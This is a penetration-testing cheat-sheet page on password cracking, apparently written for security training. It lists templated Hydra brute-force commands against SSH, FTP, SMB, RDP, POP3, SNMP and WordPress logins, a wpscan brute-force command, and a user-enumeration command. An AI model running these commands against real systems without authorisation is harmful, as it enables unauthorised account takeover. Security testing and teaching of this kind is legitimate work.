# Password Cracking

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Headings:

This page was getting to be long, so here are shortcuts to the major sections.  I broke these out into separate pages for better organization and searchability.

* [Getting the hashes](gathering-the-hashes.md)
* [Wordlist manipulation](wordlist-manipulation.md)
* [Cracking the Hashes](cracking-the-hashes.md)

Not all methods of discovering passwords involve directly "cracking" hashes.  Brute forcing logins and direct recovery programs are also viable solutions.

## Password Recovery

Password recovery programs: [https://www.passcape.com/products](https://www.passcape.com/products) \(TODO:Test these!\)

## Brute forcing logins <a id="hydra"></a>

An amazing index of brute-force commands: [https://book.hacktricks.xyz/brute-force](https://book.hacktricks.xyz/brute-force)

### Hydra

Below are a few scriptable examples to brute force logins of common protocols.

| Command | Description |
| :--- | :--- |
| `hydra -P $pass_list -v $ip snmp -vV` | Brute force against SNMP |
| `hydra -t 1 -l $user -P $pass_list -vV $ip ftp` | FTP with  known user using password list |
| `hydra -vV -u -L $users_list -P $pass_list -t 1 -u $ip ssh` | SSH using list of users and passwords |
| `hydra -vV -u -L $users_list -p $pass -t 1 -u $ip ssh` | SSH with a known password and a username list |
| `hydra -vV $ip -s $port ssh -l $user -P $pass_list` | SSH with known username on non-standard port |
| `hydra -vV -l $user -P $pass_list -f $ip pop3` | POP3 Brute Force |
| `hydra -vV -L $users_list -P $pass_list $ip http-get $login_page` | HTTP GET with user and pass list |
| `hydra -vV -t 1 -f -l $user -P $pass_list rdp://$ip` | Windows Remote Desktop with pass list |
| `hydra -vV -t 1 -f -l $user -P $pass_list $ip smb` | SMB brute force with known user and pass list |
| `hydra -vV -l $user -P $pass_list $ip http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress brute force an admin login |
| `hydra -vV -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` | WordPress enumerate users |
| `wpscan --url $url -U $user -P $pass_list` | Use wpscan to brute force password with known user |

#### Other useful Hydra options

**-x min:max:charset -** Generate passwords from min to max length. Charset can contain `1` for numbers, `a` for lowercase and `A` for uppercase characters.  Any other character that is added is put in the list.   
Example: `1:2:a1%.` The generated passwords will be of length 1 to 2 and contain lowercase letters, numbers and/or percent signs and dots.

**-e nsr -** Do additional checks. `n` for null password, `s` try login as pass, `r` try the reverse login as pass

### crackmapexec

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

[https://mpgn.gitbook.io/crackmapexec/](https://mpgn.gitbook.io/crackmapexec/)

## Resources

* [https://www.unix-ninja.com/p/A\_cheat-sheet\_for\_password\_crackers](https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers)
* [https://github.com/frizb/](https://github.com/frizb/)
* [https://guide.offsecnewbie.com/password-cracking](https://guide.offsecnewbie.com/password-cracking)
* [https://www.hackingarticles.in/abusing-kerberos-using-impacket/](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)

